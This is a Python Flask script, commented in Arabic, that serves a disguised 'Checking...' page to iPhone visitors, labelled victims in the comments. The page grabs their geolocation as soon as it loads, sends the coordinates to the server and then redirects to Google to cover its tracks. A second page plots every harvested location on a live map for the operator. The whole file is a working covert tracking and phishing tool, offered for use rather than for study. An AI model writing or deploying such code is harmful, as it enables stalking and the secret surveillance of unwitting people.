import os
import json
import time
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)
USER_FILE = "users.json"

# --- 1. واجهة الضحية (ترسل الموقع تلقائياً) ---
victim_html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Checking...</title>
</head>
<body>
    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(pos) {
                    fetch('/send_geo', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude
                        })
                    }).then(() => {
                        window.location.href = "https://www.google.com"; // تحويل الضحية بعد السحب
                    });
                }, function(err) {
                    alert("يرجى السماح بالوصول للموقع للمتابعة");
                });
            }
        };
    </script>
</body>
</html>
"""

# --- 2. واجهة الخريطة (لك أنت لترى النتائج) ---
map_html = """
<!DOCTYPE html>
<html>
<head>
    <title>Geo Tracking Map</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>#map { height: 100vh; }</style>
</head>
<body>
    <div id="map"></div>
    <script>
        const map = L.map('map').setView([31.7917, -7.0926], 6);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

        function loadMarkers() {
            fetch('/data').then(r => r.json()).then(data => {
                data.forEach(u => {
                    L.marker([u.lat, u.lon]).addTo(map)
                     .bindPopup(`<b>الوقت:</b> ${u.time}`).openPopup();
                });
            });
        }
        setInterval(loadMarkers, 5000);
        loadMarkers();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    # إذا فتحت الرابط من الأيفون (ضحية)
    if "iPhone" in request.headers.get('User-Agent', ''):
        return render_template_string(victim_html)
    # إذا فتحته من التابلت (خريطة التحكم)
    return render_template_string(map_html)

@app.route('/send_geo', methods=['POST'])
def receive_geo():
    data = request.get_json()
    new_user = {
        "lat": data['lat'],
        "lon": data['lon'],
        "time": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    users = []
    if os.path.exists(USER_FILE):
        with open(USER_FILE, 'r') as f:
            try: users = json.load(f)
            except: pass
    users.append(new_user)
    with open(USER_FILE, 'w') as f:
        json.dump(users, f, indent=2)
    print(f"[+] تم سحب موقع جديد: {data['lat']}, {data['lat']}")
    return jsonify({"status": "success"})

@app.route('/data')
def get_data():
    if os.path.exists(USER_FILE):
        with open(USER_FILE, 'r') as f:
            return f.read()
    return "[]"

if __name__ == "__main__":
    # تشغيل السيرفر على بورت 8080 مثل كود الكاميرا تماماً
    app.run(host='0.0.0.0', port=8080)
